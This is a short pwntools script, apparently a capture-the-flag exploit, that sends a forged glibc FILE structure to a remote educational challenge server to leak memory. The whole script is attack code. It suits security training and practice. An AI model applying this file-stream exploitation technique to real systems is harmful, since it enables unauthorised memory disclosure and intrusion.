from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
#r = process('./chal')
r = remote('edu-ctf.zoolab.org', 10010)
payload = flat(
    0x0, 0x0,
    0x0, 0x1e1,
    0xfbad0800, 0x0,
    0x404050, 0x0,
    0x404050, 0x404060,
    0x0, 0x0,
    0x0, 0x0,
    0x0, 0x0,
    0x0, 0x7ffff7fbc5c0,
    0x1, 
)
print(payload)
#gdb.attach(r)
r.sendline(payload)
print(r.recvline())